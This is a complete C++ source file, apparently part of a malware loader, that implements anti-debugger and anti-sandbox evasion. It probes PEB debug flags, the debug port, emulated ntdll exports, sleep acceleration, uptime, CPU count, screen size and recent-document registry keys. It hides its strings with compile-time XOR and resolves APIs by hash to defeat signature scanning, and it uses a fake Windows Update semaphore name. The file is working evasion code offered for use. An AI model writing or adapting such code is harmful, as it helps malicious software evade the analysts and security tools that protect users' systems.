/*
 * ==========================================================================
 *  Evasion.cpp — Anti-debug and anti-sandbox detection
 *
 *  CRT-free: uses custom_memset from Common.c.
 *  All Win32 APIs resolved through GetProcAddressH (no plaintext imports).
 *  Must be called after ApiHashing_InitHashes(); no Syscalls_Init() needed.
 * ==========================================================================
 */

#include "Evasion.h"
#include "ApiHashing.h"
#include "Common.h"
#include "Structs.h"
#include "..\Engine\OpsecFlags.h"

#define NT_SUCCESS(s)    (((NTSTATUS)(s)) >= 0)
#define ProcessDebugPort 7   /* NtQueryInformationProcess info class */

/* ── Compile-time string obfuscation ─────────────────────────────────────────
 *
 * String literals placed in static arrays appear verbatim in the PE's .rdata
 * section and are trivially found by `strings`, pestudio, and YARA rules.
 *
 * Fix: store every sensitive string as an array of XOR'd character constants.
 *   E('s') expands to ('s' ^ EXK) which the compiler evaluates at compile
 *   time — .rdata holds the obfuscated bytes, never the plaintext.
 *
 * At runtime, Deobf() copies the array to a stack buffer, XORs each byte with
 * EXK to recover the original string, then the caller wipes the buffer with
 * custom_memset after use.  The plaintext exists only momentarily on the stack.
 *
 * EXK is a single-byte constant visible in the disassembly, but recovering the
 * strings still requires identifying which byte arrays are "encrypted" and which
 * key belongs to them — defeating automated `strings`-based signature matching.
 * ─────────────────────────────────────────────────────────────────────────── */            

 // Generate a random key at compile time which is used as the initial hash
constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

// Compile-time seed generation for variation per build hashing, ensuring variability across different compilations
// Modulo 0xFF to ensure the seed fits within a byte, which is sufficient for our hashing needs
// % 0xFE + 1 gives range [1, 254] — never 0, which would make XOR a no-op
static constexpr auto XOR_SEED = (RandomCompileTimeSeed() % 0xFE) + 1;
#define E(c) ((BYTE)((unsigned char)(c) ^ XOR_SEED))

/* Decode len XOR'd bytes from src into dst and null-terminate.
 * dst must be at least (len + 1) bytes.  Caller zeroes dst after use. */
static void Deobf(char* dst, const BYTE* src, int len) {
    for (int i = 0; i < len; i++)
        dst[i] = (char)((unsigned char)src[i] ^ XOR_SEED);
    dst[len] = '\0';
}

/* ── Obfuscated string constants ─────────────────────────────────────────── */

/* Semaphore name: "wuauctl" (7 bytes) */
static const BYTE kObf_wuauctl[] = {
    E('w'),E('u'),E('a'),E('u'),E('c'),E('t'),E('l')
};


/* Registry key: "Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
 * (62 bytes — no null terminator in array; length supplied separately) */
static const BYTE kObf_RegKey[] = {
    E('S'),E('o'),E('f'),E('t'),E('w'),E('a'),E('r'),E('e'),
    E('\\'),E('M'),E('i'),E('c'),E('r'),E('o'),E('s'),E('o'),
    E('f'),E('t'),E('\\'),E('W'),E('i'),E('n'),E('d'),E('o'),
    E('w'),E('s'),E('\\'),E('C'),E('u'),E('r'),E('r'),E('e'),
    E('n'),E('t'),E('V'),E('e'),E('r'),E('s'),E('i'),E('o'),
    E('n'),E('\\'),E('E'),E('x'),E('p'),E('l'),E('o'),E('r'),
    E('e'),E('r'),E('\\'),E('R'),E('e'),E('c'),E('e'),E('n'),
    E('t'),E('D'),E('o'),E('c'),E('s')
};
#define kObf_RegKey_LEN 62

/* ── typedefs ─────────────────────────────────────────────────────────────── */

typedef NTSTATUS  (WINAPI *pfnZwQIP_t)         (HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef HANDLE    (WINAPI *pfnCreateSemaphoreA_t)(LPSECURITY_ATTRIBUTES, LONG, LONG, LPCSTR);
typedef BOOL      (WINAPI *pfnCloseHandle_t)   (HANDLE);
typedef DWORD     (WINAPI *pfnGetLastError_t)  (void);
typedef ULONGLONG (WINAPI *pfnGetTickCount64_t)(void);
typedef void      (WINAPI *pfnSleep_t)         (DWORD);
typedef LPVOID    (WINAPI *pfnVirtualAlloc_t)  (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL      (WINAPI *pfnVirtualFree_t)   (LPVOID, SIZE_T, DWORD);
typedef void      (WINAPI *pfnGetSystemInfo_t) (LPSYSTEM_INFO);
typedef int       (WINAPI *pfnGetSystemMetrics_t)(int);
typedef LONG      (WINAPI *pfnRegOpenKeyExA_t) (HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG      (WINAPI *pfnRegQueryInfoKeyA_t)(HKEY, LPSTR, LPDWORD, LPDWORD,
                                                  LPDWORD, LPDWORD, LPDWORD, LPDWORD,
                                                  LPDWORD, LPDWORD, LPDWORD, PFILETIME);
typedef LONG      (WINAPI *pfnRegCloseKey_t)   (HKEY);
typedef DWORD     (NTAPI  *pfnRtlComputeCrc32_t)(DWORD, const BYTE*, INT);


/* ============================================================
 *  Evasion_CheckDebugger
 *
 *  Four independent indicators examined in order of cheapness:
 *
 *  1. PEB->BeingDebugged — set by any user-mode debugger that calls
 *     DebugActiveProcess().  The value read by IsDebuggerPresent().
 *
 *  2. NtGlobalFlag — Windows sets bits 0x02|0x10|0x20 (= 0x70) when the
 *     process was started under a debugger or via gflags /p.
 *     x64 PEB offset: +0x0BC.  x86 PEB offset: +0x068.
 *
 *  3. ProcessHeap->ForceFlags — heap instrumentation field written by the
 *     loader when a debugger is present.  Always 0 in clean processes.
 *     x64 heap offset: +0x074.  x86 heap offset: +0x044.
 *
 *  4. ProcessDebugPort — NtQueryInformationProcess returns a non-NULL
 *     port handle when any debugger called DebugActiveProcess or the
 *     process was created with DEBUG_PROCESS.  Catches WinDbg KD.
 *     Called directly from ntdll exports — HellsHall not needed here.
 * ============================================================ */
BOOL Evasion_CheckDebugger(void) {
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    /* 1. BeingDebugged */
    if (pPeb->BeingDebugged) return TRUE;

    /* 2. NtGlobalFlag */
#if defined(_M_X64)
    DWORD ntGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0xBC);
#else
    DWORD ntGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0x68);
#endif
    if (ntGlobalFlag & 0x70) return TRUE;

    /* 3. ProcessHeap ForceFlags
     *    PEB->ProcessHeap lives at Reserved4[1] per Structs.h layout. */
    PVOID pHeap = pPeb->Reserved4[1];
    if (pHeap) {
#if defined(_M_X64)
        DWORD forceFlags = *(PDWORD)((PBYTE)pHeap + 0x74);
#else
        DWORD forceFlags = *(PDWORD)((PBYTE)pHeap + 0x44);
#endif
        if (forceFlags != 0) return TRUE;
    }

    /* 4. ProcessDebugPort via NtQueryInformationProcess */
    HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
    if (hNtdll) {
        pfnZwQIP_t pZwQIP = (pfnZwQIP_t)GetProcAddressH(hNtdll, g_Hash_ZwQueryInformationProcess);
        if (pZwQIP) {
            DWORD_PTR debugPort = 0;
            NTSTATUS  st = pZwQIP((HANDLE)-1, ProcessDebugPort,
                                  &debugPort, sizeof(debugPort), NULL);
            if (NT_SUCCESS(st) && debugPort != 0) return TRUE;
        }
    }

    return FALSE;
}


/* ============================================================
 *  Evasion_CheckAPIEmulation
 *
 *  Probes RtlComputeCrc32 — a genuine ntdll export on every real Windows
 *  build (XP through 11) but commonly absent from sandbox emulators that
 *  only stub high-frequency exports.
 *
 *  Identity check: CRC32(seed, buf, length=0) must return seed unchanged
 *  because no polynomial is applied to zero bytes.  An emulator that
 *  always returns 0 fails this trivial assertion.
 * ============================================================ */
BOOL Evasion_CheckAPIEmulation(void) {
    HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
    if (!hNtdll) return FALSE;

    pfnRtlComputeCrc32_t pCrc =
        (pfnRtlComputeCrc32_t)GetProcAddressH(hNtdll, g_Hash_RtlComputeCrc32);

    if (!pCrc) return TRUE;   /* export missing — emulated ntdll */

    static const BYTE kEmpty[1] = { 0 };
    DWORD result = pCrc(0xDEADC0DE, kEmpty, 0);
    if (result != 0xDEADC0DE) return TRUE;  /* wrong identity result */

    return FALSE;
}


/* ============================================================
 *  Evasion_CheckExecControl
 *
 *  Creates a named semaphore "wuauctl" (Windows Update–sounding name).
 *  If ERROR_ALREADY_EXISTS is returned, a prior instance is running in
 *  this session — sandbox re-execution detected.
 *  On first run, the handle is left open intentionally so subsequent
 *  instances reliably detect it.
 * ============================================================ */
BOOL Evasion_CheckExecControl(const char* pSemName) {
    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) return FALSE;

    pfnCreateSemaphoreA_t pCreateSem =
        (pfnCreateSemaphoreA_t)GetProcAddressH(hKernel32, g_Hash_CreateSemaphoreA);
    pfnCloseHandle_t  pClose =
        (pfnCloseHandle_t)GetProcAddressH(hKernel32, g_Hash_CloseHandle);
    pfnGetLastError_t pGLE   =
        (pfnGetLastError_t)GetProcAddressH(hKernel32, g_Hash_GetLastError);

    if (!pCreateSem || !pClose || !pGLE) return FALSE;

    /* If a custom semaphore name was provided, use it directly (plaintext in metadata).
     * Otherwise decode the obfuscated default "wuauctl" to stack and wipe after use. */
    char     defBuf[8];
    BOOL     usingDefault = (!pSemName || !*pSemName);
    const char* pName;

    if (usingDefault) {
        Deobf(defBuf, kObf_wuauctl, 7);
        pName = defBuf;
    } else {
        pName = pSemName;
    }

    HANDLE hSem = pCreateSem(NULL, 0, 1, pName);
    if (usingDefault) custom_memset(defBuf, 0, sizeof(defBuf));
    if (!hSem) return FALSE;

    if (pGLE() == ERROR_ALREADY_EXISTS) {
        pClose(hSem);   /* release our duplicate; first instance keeps its handle */
        return TRUE;
    }

    /* First creation — handle intentionally left open for process lifetime */
    return FALSE;
}


/* ============================================================
 *  Evasion_CheckSleepForwarding
 *
 *  Calls Sleep(500) and measures the elapsed real time via GetTickCount64.
 *  Returns TRUE if fewer than 450 ms elapsed — the sleep was fast-forwarded
 *  by the sandbox's time-acceleration mechanism.
 *
 *  This is a HARD check: sleep forwarding is a definitive indicator that
 *  execution is taking place inside an automated analysis environment.
 *  No legitimate system returns from a 500 ms sleep in under 450 ms.
 * ============================================================ */
BOOL Evasion_CheckSleepForwarding(DWORD ms) {
    if (ms == 0) ms = 500;

    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) return FALSE;

    pfnSleep_t          pSleep =
        (pfnSleep_t)GetProcAddressH(hKernel32, g_Hash_Sleep);
    pfnGetTickCount64_t pGTC   =
        (pfnGetTickCount64_t)GetProcAddressH(hKernel32, g_Hash_GetTickCount64);

    if (!pSleep || !pGTC) return FALSE;

    /* Threshold: 90% of requested sleep — proportional tolerance regardless of ms value. */
    ULONGLONG threshold = (ULONGLONG)(ms - ms / 10);

    ULONGLONG before = pGTC();
    pSleep(ms);
    ULONGLONG elapsed = pGTC() - before;

    return (elapsed < threshold);   /* elapsed < 90% of ms → time was accelerated */
}


/* ============================================================
 *  Evasion_CheckUptime
 *
 *  GetTickCount64 returns milliseconds since last system boot.
 *  Analysis VMs provisioned per-sample typically start from a snapshot
 *  and have uptimes of 30–90 seconds.  Threshold: 2 minutes.
 * ============================================================ */
BOOL Evasion_CheckUptime(DWORD minutes) {
    if (minutes == 0) minutes = 2;

    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) return FALSE;

    pfnGetTickCount64_t pGTC =
        (pfnGetTickCount64_t)GetProcAddressH(hKernel32, g_Hash_GetTickCount64);
    if (!pGTC) return FALSE;

    return pGTC() < ((ULONGLONG)minutes * 60ULL * 1000ULL);
}


/* ============================================================
 *  Evasion_CheckCpuCount
 *
 *  Analysis VMs are commonly assigned 1 vCPU to reduce host overhead.
 *  No modern physical workstation has fewer than 2 logical cores.
 * ============================================================ */
BOOL Evasion_CheckCpuCount(void) {
    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) return FALSE;

    pfnGetSystemInfo_t pGSI =
        (pfnGetSystemInfo_t)GetProcAddressH(hKernel32, g_Hash_GetSystemInfo);
    if (!pGSI) return FALSE;

    SYSTEM_INFO si;
    custom_memset(&si, 0, sizeof(si));
    pGSI(&si);

    return (si.dwNumberOfProcessors < 2);
}


/* ============================================================
 *  Evasion_CheckScreenResolution
 *
 *  Queries SM_CXSCREEN (index 0) via GetSystemMetrics.
 *  Sandboxes typically run at 800x600 or 1024x768; real workstations
 *  are almost universally 1280x720 (HD) or higher.
 *  Threshold: screen width <= 1024 pixels.
 *
 *  Skipped silently when user32.dll is not already mapped in the process —
 *  avoids loading a new DLL as a side effect of an evasion check.
 * ============================================================ */
BOOL Evasion_CheckScreenResolution(void) {
    HMODULE hUser32 = GetModuleHandleH(g_Hash_user32);
    if (!hUser32) return FALSE;   /* user32 not loaded — skip, no false positive */

    pfnGetSystemMetrics_t pGSM =
        (pfnGetSystemMetrics_t)GetProcAddressH(hUser32, g_Hash_GetSystemMetrics);
    if (!pGSM) return FALSE;

    int cxScreen = pGSM(0 /* SM_CXSCREEN */);
    if (cxScreen == 0) return FALSE;   /* no display (service/session 0) — skip */

    return (cxScreen <= 1024);
}


/* ============================================================
 *  Evasion_CheckRecentFiles
 *
 *  Opens HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
 *  and counts its subkeys.  Each subkey represents one file-extension group
 *  of recently opened documents (.docx, .pdf, .xlsx, etc.).
 *
 *  A real user's workstation typically accumulates 5+ extension groups.
 *  A freshly provisioned analysis VM has 0 and is flagged.
 *  Threshold: fewer than 5 extension subkeys.
 *
 *  Skipped silently when advapi32.dll is not already loaded — avoids
 *  introducing a new DLL import as a side effect of an evasion check.
 * ============================================================ */
BOOL Evasion_CheckRecentFiles(void) {
    HMODULE hAdvapi32 = GetModuleHandleH(g_Hash_advapi32);
    if (!hAdvapi32) return FALSE;

    pfnRegOpenKeyExA_t  pOpenKey =
        (pfnRegOpenKeyExA_t)GetProcAddressH(hAdvapi32, g_Hash_RegOpenKeyExA);
    pfnRegQueryInfoKeyA_t pQueryKey =
        (pfnRegQueryInfoKeyA_t)GetProcAddressH(hAdvapi32, g_Hash_RegQueryInfoKeyA);
    pfnRegCloseKey_t    pCloseKey =
        (pfnRegCloseKey_t)GetProcAddressH(hAdvapi32, g_Hash_RegCloseKey);

    if (!pOpenKey || !pQueryKey || !pCloseKey) return FALSE;

    /* Decode registry key path to stack buffer */
    char regPath[kObf_RegKey_LEN + 1];
    Deobf(regPath, kObf_RegKey, kObf_RegKey_LEN);

    HKEY hKey = NULL;
    LONG st = pOpenKey(HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hKey);
    custom_memset(regPath, 0, sizeof(regPath));

    if (st != ERROR_SUCCESS || !hKey) return FALSE;

    DWORD cSubKeys = 0;
    pQueryKey(hKey,
              NULL, NULL, NULL,     /* class name — not needed */
              &cSubKeys,            /* number of extension subkeys */
              NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    pCloseKey(hKey);

    /* Fewer than 5 extension subkeys → fresh/fake user profile */
    return (cSubKeys < 5);
}


/* ============================================================
 *  Evasion_RunChecks
 *
 *  Orchestrates all checks, respecting per-check EVASION_FLAG_NO_* bits.
 *
 *  Hard checks — one positive is sufficient to return TRUE:
 *    CheckDebugger, CheckAPIEmulation, CheckExecControl, CheckSleepForwarding
 *
 *  Soft checks — ≥ 2 must fire before returning TRUE (reduces false positives
 *  from unusual-but-legitimate configurations):
 *    CheckUptime, CheckCpuCount, CheckUsername,
 *    CheckScreenResolution, CheckRecentFiles
 * ============================================================ */
BOOL Evasion_RunChecks(DWORD flags, const char* pSemName, DWORD sleepFwdMs, DWORD uptimeMin) {
    /* Shortcut: all evasion disabled */
    if (flags & EVASION_FLAG_NO_ALL) return FALSE;

    /* Hard checks */
    if (!(flags & EVASION_FLAG_NO_DEBUGGER)  && Evasion_CheckDebugger())                    return TRUE;
    if (!(flags & EVASION_FLAG_NO_API_EMU)   && Evasion_CheckAPIEmulation())                return TRUE;
    if (!(flags & EVASION_FLAG_NO_EXEC_CTRL) && Evasion_CheckExecControl(pSemName))         return TRUE;
    if (!(flags & EVASION_FLAG_NO_SLEEP_FWD) && Evasion_CheckSleepForwarding(sleepFwdMs))   return TRUE;

    /* Soft checks — scored */
    int score = 0;
    if (!(flags & EVASION_FLAG_NO_UPTIME)        && Evasion_CheckUptime(uptimeMin))      score++;
    if (!(flags & EVASION_FLAG_NO_CPU_COUNT)     && Evasion_CheckCpuCount())             score++;
    if (!(flags & EVASION_FLAG_NO_SCREEN_RES)    && Evasion_CheckScreenResolution())     score++;
    if (!(flags & EVASION_FLAG_NO_RECENT_FILES)  && Evasion_CheckRecentFiles())          score++;
    if (score >= 2) return TRUE;

    return FALSE;
}


/* ============================================================
 *  Evasion_HammerDelay
 *
 *  Consumes dwMilliseconds of real wall-clock time via VirtualAlloc/VirtualFree
 *  pairs timed by GetTickCount64.
 *
 *  VirtualAlloc round-trips cannot be silently skipped by sandbox
 *  time-accelerators without breaking correctness; Sleep() can.
 *  GetTickCount64 reflects real elapsed time in most sandboxes (they only
 *  fast-forward Sleep-class waits, not the system clock itself).
 * ============================================================ */
void Evasion_HammerDelay(DWORD dwMilliseconds, DWORD flags) {
    if (flags & EVASION_FLAG_NO_ALL)    return;
    if (flags & EVASION_FLAG_NO_HAMMER) return;

    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!hKernel32) return;

    pfnGetTickCount64_t pGTC =
        (pfnGetTickCount64_t)GetProcAddressH(hKernel32, g_Hash_GetTickCount64);
    pfnVirtualAlloc_t pVA =
        (pfnVirtualAlloc_t)GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
    pfnVirtualFree_t pVF =
        (pfnVirtualFree_t)GetProcAddressH(hKernel32, g_Hash_VirtualFree);

    if (!pGTC || !pVA || !pVF) return;

    ULONGLONG deadline = pGTC() + (ULONGLONG)dwMilliseconds;

    while (pGTC() < deadline) {
        /* Two syscalls per iteration: NtAllocateVirtualMemory + NtFreeVirtualMemory.
         * Sandbox must honour both; skipping either breaks process address space. */
        LPVOID p = pVA(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (p) pVF(p, 0, MEM_RELEASE);
    }
}
